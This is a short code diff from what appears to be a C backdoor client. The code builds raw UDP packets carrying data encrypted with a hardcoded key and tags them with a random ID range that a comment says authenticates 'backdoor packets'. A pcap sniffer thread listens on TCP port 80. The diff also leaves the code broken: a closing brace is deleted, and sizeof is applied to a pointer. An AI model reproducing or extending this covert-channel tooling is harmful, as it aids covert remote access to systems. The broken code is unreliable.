@@ -175,16 +175,13 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_udp.udp.len = 0;
 		packets_udp.udp.check = 0;
 
-		// Add the data to the datagram
-		// encrypt data
+		// Add the data to the datagram encrypt data
 		encrypt(SEKRET, msg, sizeof(msg));
 		strcpy(packets_udp.data, msg);
 
 		packets_udp.udp.source = htons(c->source_port);
 
 		packets_udp.udp.dest = htons(c->dest_port);
-
-		//packets_udp.udp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
 
 		// generate random id between 5000 and 5050 used to authenticate backdoor packets
 		randomID = randomRange(5000, 5050);
@@ -293,12 +290,8 @@ void *sniffer_thread(void *args) {
 	strcpy(filter, "tcp dst port 80");
 
 	if ((pd = open_pcap_socket(device, filter))) {
-		//while (running) {
 		if (pcap_loop(pd, 0, (pcap_handler) parse_response_packet, 0) < 0)
 			printf("pcap_loop(): failed: %s\n", pcap_geterr(pd));
-		//}
-		//running = true;
-	}
 
 	return NULL;
 }
